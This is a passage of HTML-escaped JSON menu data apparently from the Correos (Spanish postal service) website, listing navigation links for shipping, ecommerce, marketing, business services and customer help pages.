información&quot;,&quot;id&quot;:&quot;seguridad-de-la-información&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Admisión internacional de correspondencia y paquetería&quot;,&quot;id&quot;:&quot;admisión-internacional-de-correspondencia-y-paquetería&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-covid-19/admision-internacional-de-correspondencia-y-paqueteria&quot;},{&quot;name&quot;:&quot;Correos una empresa segura frente al COVID-19&quot;,&quot;id&quot;:&quot;correos-una-empresa-segura-frente-al-covid-19&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-covid-19/correos-una-empresa-segura-frente-al-covid-19&quot;},{&quot;name&quot;:&quot;Envíos con destino China &quot;,&quot;id&quot;:&quot;envíos-con-destino-china-&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-covid-19/envios-con-destino-china-&quot;}],&quot;name&quot;:&quot;Especial Covid-19&quot;,&quot;id&quot;:&quot;especial-covid-19&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Especial Ucrania/Rusia&quot;,&quot;id&quot;:&quot;especial-ucrania/rusia&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-ucrania-rusia&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-help&quot;,&quot;name&quot;:&quot;Ayuda&quot;,&quot;id&quot;:&quot;ayuda&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente&quot;,&quot;titleLink&quot;:&quot;Ayuda&quot;}],&quot;name&quot;:&quot;&quot;,&quot;id&quot;:&quot;adicionalesParticular&quot;},{&quot;children&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-home&quot;,&quot;name&quot;:&quot;Inicio&quot;,&quot;id&quot;:&quot;inicio&quot;,&quot;href&quot;:&quot;/es/es/empresas&quot;,&quot;titleLink&quot;:&quot;Inicio&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Paquete Premium&quot;,&quot;id&quot;:&quot;paquete-premium&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-nacionales/paquete-premium&quot;},{&quot;name&quot;:&quot;Paquete Estándar&quot;,&quot;id&quot;:&quot;paquete-estándar&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-nacionales/paquete-estandar&quot;},{&quot;name&quot;:&quot;Paq Ligero&quot;,&quot;id&quot;:&quot;paq-ligero&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-nacionales/paq-ligero&quot;},{&quot;name&quot;:&quot;Correos Frío&quot;,&quot;id&quot;:&quot;correos-frío&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-nacionales/correos-frio&quot;}],&quot;name&quot;:&quot;Envíos nacionales&quot;,&quot;id&quot;:&quot;envíos-nacionales&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-nacionales&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Paquete Internacional Premium&quot;,&quot;id&quot;:&quot;paquete-internacional-premium&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-internacionales/paquete-internacional-premium&quot;},{&quot;name&quot;:&quot;Paquete Internacional Standard&quot;,&quot;id&quot;:&quot;paquete-internacional-standard&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-internacionales/paquete-internacional-standard&quot;},{&quot;name&quot;:&quot;Paquete Internacional Económico&quot;,&quot;id&quot;:&quot;paquete-internacional-económico&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-internacionales/paquete-internacional-economico&quot;},{&quot;name&quot;:&quot;Paquete Internacional Light&quot;,&quot;id&quot;:&quot;paquete-internacional-light&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-internacionales/paq-light&quot;},{&quot;name&quot;:&quot;Zonas internacionales&quot;,&quot;id&quot;:&quot;zonas-internacionales&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-internacionales/zonas-internacionales&quot;},{&quot;name&quot;:&quot;Gestión aduanera de exportación&quot;,&quot;id&quot;:&quot;gestión-aduanera-de-exportación&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-internacionales/gestion-aduanera-de-exportacion&quot;}],&quot;name&quot;:&quot;Envíos Internacionales&quot;,&quot;id&quot;:&quot;envíos-internacionales&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/envios-internacionales&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Burofax&quot;,&quot;id&quot;:&quot;burofax&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/comunicaciones-postales-para-empresas/burofax&quot;},{&quot;name&quot;:&quot;Carta&quot;,&quot;id&quot;:&quot;carta&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/comunicaciones-postales-para-empresas/cartas&quot;},{&quot;name&quot;:&quot;Buzón de vacaciones&quot;,&quot;id&quot;:&quot;buzón-de-vacaciones&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/comunicaciones-postales-para-empresas/buzon-de-vacaciones&quot;},{&quot;name&quot;:&quot;Apartado postal&quot;,&quot;id&quot;:&quot;apartado-postal&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/comunicaciones-postales-para-empresas/apartado-postal&quot;},{&quot;name&quot;:&quot;Reenvío postal&quot;,&quot;id&quot;:&quot;reenvío-postal&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/comunicaciones-postales-para-empresas/reenvio-postal&quot;}],&quot;name&quot;:&quot;Comunicaciones postales para empresas&quot;,&quot;id&quot;:&quot;comunicaciones-postales-para-empresas&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/comunicaciones-postales-para-empresas&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Sobre y embalajes&quot;,&quot;id&quot;:&quot;sobre-y-embalajes&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/sobres-y-embalajes/sobre-y-embalajes&quot;},{&quot;name&quot;:&quot;Línea Bosques&quot;,&quot;id&quot;:&quot;línea-bosques&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/sobres-y-embalajes/linea-bosques&quot;},{&quot;name&quot;:&quot;Prefanqueados/prepagados&quot;,&quot;id&quot;:&quot;prefanqueados/prepagados&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/sobres-y-embalajes/prefanqueados-prepagados&quot;}],&quot;name&quot;:&quot;Sobres y embalajes&quot;,&quot;id&quot;:&quot;sobres-y-embalajes&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/sobres-y-embalajes&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Sellos&quot;,&quot;id&quot;:&quot;sellos&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar/sellos&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-send&quot;,&quot;name&quot;:&quot;Enviar&quot;,&quot;id&quot;:&quot;enviar&quot;,&quot;href&quot;:&quot;/es/es/empresas/enviar&quot;,&quot;titleLink&quot;:&quot;Enviar&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Crear Tienda Online&quot;,&quot;id&quot;:&quot;crear-tienda-online&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/encuentra-lugares-para-vender-online/crear-tienda-online&quot;},{&quot;name&quot;:&quot;Marketplaces&quot;,&quot;id&quot;:&quot;marketplaces&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/encuentra-lugares-para-vender-online/vender-en-marketplaces&quot;}],&quot;name&quot;:&quot;Encuentra lugares para vender online&quot;,&quot;id&quot;:&quot;encuentra-lugares-para-vender-online&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/encuentra-lugares-para-vender-online&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;PrestaShop&quot;,&quot;id&quot;:&quot;prestashop&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/agiliza-la-gestion-de-tus-pedidos/prestashop&quot;},{&quot;name&quot;:&quot;Magento&quot;,&quot;id&quot;:&quot;magento&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/agiliza-la-gestion-de-tus-pedidos/magento&quot;},{&quot;name&quot;:&quot;WooCommerce&quot;,&quot;id&quot;:&quot;woocommerce&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/agiliza-la-gestion-de-tus-pedidos/woocommerce&quot;},{&quot;name&quot;:&quot;Software de gestión GECO&quot;,&quot;id&quot;:&quot;software-de-gestión-geco&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/agiliza-la-gestion-de-tus-pedidos/software-de-gestion-geco&quot;}],&quot;name&quot;:&quot;Agiliza la gestión de tus pedidos&quot;,&quot;id&quot;:&quot;agiliza-la-gestión-de-tus-pedidos&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/agiliza-la-gestion-de-tus-pedidos&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Citypaq empresas&quot;,&quot;id&quot;:&quot;citypaq-empresas&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/refuerza-la-logistica-de-tu-ecommerce/citypaq-empresas&quot;},{&quot;name&quot;:&quot;Integración API&quot;,&quot;id&quot;:&quot;integración-api&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/refuerza-la-logistica-de-tu-ecommerce/integracion-api&quot;},{&quot;name&quot;:&quot;Integración ficheros&quot;,&quot;id&quot;:&quot;integración-ficheros&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/refuerza-la-logistica-de-tu-ecommerce/integracion-ficheros&quot;},{&quot;name&quot;:&quot;Bases de datos de Puntos de Entrega&quot;,&quot;id&quot;:&quot;bases-de-datos-de-puntos-de-entrega&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/refuerza-la-logistica-de-tu-ecommerce/bases-de-datos-de-puntos-de-entrega&quot;}],&quot;name&quot;:&quot;Refuerza la logística de tu ecommerce&quot;,&quot;id&quot;:&quot;refuerza-la-logística-de-tu-ecommerce&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Logística Inversa&quot;,&quot;id&quot;:&quot;logística-inversa&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/facilita-las-devoluciones-a-tus-clientes/logistica-inversa&quot;},{&quot;name&quot;:&quot;Paq Retorno Premium&quot;,&quot;id&quot;:&quot;paq-retorno-premium&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/facilita-las-devoluciones-a-tus-clientes/paq-retorno-premium&quot;},{&quot;name&quot;:&quot;Franqueo en destino&quot;,&quot;id&quot;:&quot;franqueo-en-destino&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/facilita-las-devoluciones-a-tus-clientes/franqueo-en-destino&quot;},{&quot;name&quot;:&quot;Paq Return internacional&quot;,&quot;id&quot;:&quot;paq-return-internacional&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/facilita-las-devoluciones-a-tus-clientes/paq-return-internacional&quot;},{&quot;name&quot;:&quot;Portal de Devoluciones&quot;,&quot;id&quot;:&quot;portal-de-devoluciones&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/facilita-las-devoluciones-a-tus-clientes/portal-de-devoluciones&quot;}],&quot;name&quot;:&quot;Facilita las devoluciones a tus clientes&quot;,&quot;id&quot;:&quot;facilita-las-devoluciones-a-tus-clientes&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce/facilita-las-devoluciones-a-tus-clientes&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-ecommerce&quot;,&quot;name&quot;:&quot;Ecommerce&quot;,&quot;id&quot;:&quot;ecommerce&quot;,&quot;href&quot;:&quot;/es/es/empresas/ecommerce&quot;,&quot;titleLink&quot;:&quot;Ecommerce&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Mailing&quot;,&quot;id&quot;:&quot;mailing&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/comunicate-con-tus-clientes-de-manera-efectiva/mailing&quot;},{&quot;name&quot;:&quot;Publicidad sin personalizar&quot;,&quot;id&quot;:&quot;publicidad-sin-personalizar&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/comunicate-con-tus-clientes-de-manera-efectiva/publicidad-sin-personalizar&quot;}],&quot;name&quot;:&quot;Comunícate con tus clientes de manera efectiva&quot;,&quot;id&quot;:&quot;comunícate-con-tus-clientes-de-manera-efectiva&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/comunicate-con-tus-clientes-de-manera-efectiva&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Base de Datos de Códigos Postales&quot;,&quot;id&quot;:&quot;base-de-datos-de-códigos-postales&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/identifica-a-tus-clientes-potenciales/base-de-datos-de-codigos-postales&quot;}],&quot;name&quot;:&quot;Identifica a tus clientes potenciales&quot;,&quot;id&quot;:&quot;identifica-a-tus-clientes-potenciales&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/identifica-a-tus-clientes-potenciales&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Correos Sampling &quot;,&quot;id&quot;:&quot;correos-sampling-&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/llega-hasta-tus-clientes-y-fidelizalos/correos-sampling&quot;},{&quot;name&quot;:&quot;Correos Add&quot;,&quot;id&quot;:&quot;correos-add&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/llega-hasta-tus-clientes-y-fidelizalos/correos-add&quot;},{&quot;name&quot;:&quot;Soluciones para pymes&quot;,&quot;id&quot;:&quot;soluciones-para-pymes&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/llega-hasta-tus-clientes-y-fidelizalos/soluciones-para-pymes&quot;}],&quot;name&quot;:&quot;Llega hasta tus clientes y fidelízalos&quot;,&quot;id&quot;:&quot;llega-hasta-tus-clientes-y-fidelízalos&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/llega-hasta-tus-clientes-y-fidelizalos&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Generación y captura dinámica de leads&quot;,&quot;id&quot;:&quot;generación-y-captura-dinámica-de-leads&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/optimiza-tus-campanas-de-marketing/generacion-y-captura-dinamica-de-leads&quot;},{&quot;name&quot;:&quot;Información de Devoluciones&quot;,&quot;id&quot;:&quot;información-de-devoluciones&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/optimiza-tus-campanas-de-marketing/informacion-de-devoluciones&quot;},{&quot;name&quot;:&quot;Impresión y manipulado&quot;,&quot;id&quot;:&quot;impresión-y-manipulado&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/optimiza-tus-campanas-de-marketing/impresion-y-manipulado&quot;},{&quot;name&quot;:&quot;Seguimiento de campañas&quot;,&quot;id&quot;:&quot;seguimiento-de-campañas&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/optimiza-tus-campanas-de-marketing/seguimiento-de-campanas&quot;}],&quot;name&quot;:&quot;Optimiza tus campañas de marketing&quot;,&quot;id&quot;:&quot;optimiza-tus-campañas-de-marketing&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing/optimiza-tus-campanas-de-marketing&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-marketing&quot;,&quot;name&quot;:&quot;Marketing&quot;,&quot;id&quot;:&quot;marketing&quot;,&quot;href&quot;:&quot;/es/es/empresas/marketing&quot;,&quot;titleLink&quot;:&quot;Marketing&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Gestión de albaranes GANES&quot;,&quot;id&quot;:&quot;gestión-de-albaranes-ganes&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales/sistemas-de-gestion-de-albaranes/gestion-de-albaranes-ganes&quot;},{&quot;name&quot;:&quot;Albaranes y Depósitos Online ADO&quot;,&quot;id&quot;:&quot;albaranes-y-depósitos-online-ado&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales/sistemas-de-gestion-de-albaranes/albaranes-y-depositos-online-ado&quot;}],&quot;name&quot;:&quot;Sistemas de gestión de albaranes&quot;,&quot;id&quot;:&quot;sistemas-de-gestión-de-albaranes&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Plataforma multicanal Nexo&quot;,&quot;id&quot;:&quot;plataforma-multicanal-nexo&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales/plataforma-multicanal-nexo&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Notificaciones Administrativas&quot;,&quot;id&quot;:&quot;notificaciones-administrativas&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales/aliados-del-sector-publico/notificaciones-administrativas&quot;},{&quot;name&quot;:&quot;Servicio de Registro Virtual Electrónico con la Administración (ORVE)&quot;,&quot;id&quot;:&quot;servicio-de-registro-virtual-electrónico-con-la-administración-(orve)&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales/aliados-del-sector-publico/servicio-de-registro-virtual-electronico-con-la-administracion&quot;},{&quot;name&quot;:&quot;Autoridad de Sellado de Tiempo&quot;,&quot;id&quot;:&quot;autoridad-de-sellado-de-tiempo&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales/aliados-del-sector-publico/autoridad-de-sellado-de-tiempo&quot;}],&quot;name&quot;:&quot;Aliados del Sector Público&quot;,&quot;id&quot;:&quot;aliados-del-sector-público&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales/aliados-del-sector-publico&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-communications&quot;,&quot;name&quot;:&quot;Comunicaciones físicas y digitales&quot;,&quot;id&quot;:&quot;comunicaciones-físicas-y-digitales&quot;,&quot;href&quot;:&quot;/es/es/empresas/comunicaciones-fisicas-y-digitales&quot;,&quot;titleLink&quot;:&quot;Comunicaciones físicas y digitales&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Agentes comerciales&quot;,&quot;id&quot;:&quot;agentes-comerciales&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas/agentes-comerciales&quot;},{&quot;name&quot;:&quot;Agentes turísticos&quot;,&quot;id&quot;:&quot;agentes-turísticos&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas/agentes-turisticos&quot;},{&quot;name&quot;:&quot;Desarrolla tu idea de negocio &quot;,&quot;id&quot;:&quot;desarrolla-tu-idea-de-negocio-&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas/desarrolla-tu-idea-de-negocio&quot;},{&quot;name&quot;:&quot;Publicaciones Periódicas&quot;,&quot;id&quot;:&quot;publicaciones-periódicas&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas/publicaciones-periodicas&quot;},{&quot;name&quot;:&quot;Libros&quot;,&quot;id&quot;:&quot;libros&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas/libros&quot;},{&quot;name&quot;:&quot;Correos Market&quot;,&quot;id&quot;:&quot;correos-market&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas/correos-market&quot;},{&quot;name&quot;:&quot;Correos Logística&quot;,&quot;id&quot;:&quot;correos-logística&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas/correos-logistica&quot;}],&quot;name&quot;:&quot;Soluciones específicas &quot;,&quot;id&quot;:&quot;soluciones-específicas-&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/soluciones-especificas&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Kit Digital | Transformación Digital&quot;,&quot;id&quot;:&quot;kit-digital-|-transformación-digital&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/kit-digital&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Cobro de recibos&quot;,&quot;id&quot;:&quot;cobro-de-recibos&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/lleva-el-control-financiero-de-tu-negocio/cobro-de-recibos&quot;},{&quot;name&quot;:&quot;Correos Pay&quot;,&quot;id&quot;:&quot;correos-pay&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/lleva-el-control-financiero-de-tu-negocio/correos-pay&quot;},{&quot;name&quot;:&quot;Correos Cash&quot;,&quot;id&quot;:&quot;correos-cash&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/lleva-el-control-financiero-de-tu-negocio/correos-cash&quot;},{&quot;name&quot;:&quot;Tarjeta Correos Prepago Empresas&quot;,&quot;id&quot;:&quot;tarjeta-correos-prepago-empresas&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/lleva-el-control-financiero-de-tu-negocio/tarjeta-correos-prepago-empresas&quot;}],&quot;name&quot;:&quot;Lleva el control financiero de tu negocio&quot;,&quot;id&quot;:&quot;lleva-el-control-financiero-de-tu-negocio&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/lleva-el-control-financiero-de-tu-negocio&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Tarjeta Más Cerca&quot;,&quot;id&quot;:&quot;tarjeta-más-cerca&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/como-ser-cliente-de-correos/tarjeta-mas-cerca&quot;}],&quot;name&quot;:&quot;Cómo ser cliente de Correos&quot;,&quot;id&quot;:&quot;cómo-ser-cliente-de-correos&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/como-ser-cliente-de-correos&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Distintivo Ambiental DGT&quot;,&quot;id&quot;:&quot;distintivo-ambiental-dgt&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/servicios-de-la-dgt/distintivo-ambiental-dgt&quot;},{&quot;name&quot;:&quot;Duplicado del Permiso de Circulación&quot;,&quot;id&quot;:&quot;duplicado-del-permiso-de-circulación&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/servicios-de-la-dgt/duplicado-del-permiso-de-circulacion&quot;},{&quot;name&quot;:&quot;Cambio de Titularidad&quot;,&quot;id&quot;:&quot;cambio-de-titularidad&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/servicios-de-la-dgt/cambio-de-titularidad&quot;},{&quot;name&quot;:&quot;Notificación de venta de un vehículo&quot;,&quot;id&quot;:&quot;notificación-de-venta-de-un-vehículo&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/servicios-de-la-dgt/notificacion-de-venta-de-un-vehiculo&quot;}],&quot;name&quot;:&quot;Servicios de la DGT&quot;,&quot;id&quot;:&quot;servicios-de-la-dgt&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio/servicios-de-la-dgt&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-business&quot;,&quot;name&quot;:&quot;Para tu negocio&quot;,&quot;id&quot;:&quot;para-tu-negocio&quot;,&quot;href&quot;:&quot;/es/es/empresas/para-tu-negocio&quot;,&quot;titleLink&quot;:&quot;Para tu negocio&quot;}],&quot;name&quot;:&quot;Empresa&quot;,&quot;id&quot;:&quot;empresa&quot;},{&quot;children&quot;:[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-settings&quot;,&quot;name&quot;:&quot;Herramientas&quot;,&quot;id&quot;:&quot;herramientas&quot;,&quot;href&quot;:&quot;/es/es/empresas/herramientas&quot;,&quot;titleLink&quot;:&quot;Herramientas&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-news&quot;,&quot;name&quot;:&quot;Actualidad&quot;,&quot;id&quot;:&quot;actualidad&quot;,&quot;href&quot;:&quot;/es/es/actualidad&quot;,&quot;titleLink&quot;:&quot;Actualidad&quot;},{&quot;relatedModal&quot;:&quot;&quot;,&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-cart&quot;,&quot;name&quot;:&quot;Tienda&quot;,&quot;id&quot;:&quot;tienda&quot;,&quot;href&quot;:&quot;https://market.correos.es/category/correos&quot;,&quot;titleLink&quot;:&quot;Tienda&quot;},{&quot;children&quot;:[{&quot;children&quot;:[{&quot;name&quot;:&quot;Cómo preparar el envío&quot;,&quot;id&quot;:&quot;cómo-preparar-el-envío&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/como-preparar-envio&quot;},{&quot;name&quot;:&quot;Cómo funciona Mi Oficina&quot;,&quot;id&quot;:&quot;cómo-funciona-mi-oficina&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/como-funciona-mi-oficina&quot;},{&quot;name&quot;:&quot;Dimensiones y pesos&quot;,&quot;id&quot;:&quot;dimensiones-y-pesos&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/dimensiones-y-pesos&quot;},{&quot;name&quot;:&quot;Tratamiento de tus datos&quot;,&quot;id&quot;:&quot;tratamiento-de-tus-datos&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/tratamiento-de-tus-datos&quot;},{&quot;name&quot;:&quot;Sellos y franqueo&quot;,&quot;id&quot;:&quot;sellos-y-franqueo&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/enviar/sellos-y-franqueo&quot;}],&quot;name&quot;:&quot;Enviar&quot;,&quot;id&quot;:&quot;enviar&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Recoger envío&quot;,&quot;id&quot;:&quot;recoger-envío&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/recoger-envio&quot;},{&quot;name&quot;:&quot;Código de envío&quot;,&quot;id&quot;:&quot;código-de-envío&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/codigo-de-envio&quot;},{&quot;name&quot;:&quot;Aviso de llegada&quot;,&quot;id&quot;:&quot;aviso-de-llegada&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/aviso-de-llegada&quot;},{&quot;name&quot;:&quot;Envíos estacionados&quot;,&quot;id&quot;:&quot;envíos-estacionados&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/envios-estacionados&quot;},{&quot;name&quot;:&quot;Incidencias&quot;,&quot;id&quot;:&quot;incidencias&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/recibir/incidencias&quot;}],&quot;name&quot;:&quot;Recibir&quot;,&quot;id&quot;:&quot;recibir&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Correos ID&quot;,&quot;id&quot;:&quot;correos-id&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/otras-consultas/correos-id&quot;}],&quot;name&quot;:&quot;Otras consultas&quot;,&quot;id&quot;:&quot;otras-consultas&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/otras-consultas&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;DUA Importación&quot;,&quot;id&quot;:&quot;dua-importación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/dua-importacion&quot;},{&quot;name&quot;:&quot;DUA Exportación&quot;,&quot;id&quot;:&quot;dua-exportación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/dua-exportacion&quot;},{&quot;name&quot;:&quot;Brexit, importación y exportación con el Reino Unido&quot;,&quot;id&quot;:&quot;brexit,-importación-y-exportación-con-el-reino-unido&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/brexit&quot;},{&quot;name&quot;:&quot;Nuevo Proceso de Seguridad de Importación&quot;,&quot;id&quot;:&quot;nuevo-proceso-de-seguridad-de-importación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/nuevo-proceso-seguridad-importacion&quot;},{&quot;name&quot;:&quot;IVA de importación en el Comercio Electrónico &quot;,&quot;id&quot;:&quot;iva-de-importación-en-el-comercio-electrónico-&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera/iva-de-importacion-en-el-comercio-electronico&quot;}],&quot;name&quot;:&quot;Información aduanera&quot;,&quot;id&quot;:&quot;información-aduanera&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/informacion-aduanera&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Nacionales&quot;,&quot;id&quot;:&quot;nacionales&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/coberturas-y-garantias/nacionales&quot;},{&quot;name&quot;:&quot;Internacionales&quot;,&quot;id&quot;:&quot;internacionales&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/coberturas-y-garantias/internacionales&quot;}],&quot;name&quot;:&quot;Coberturas y 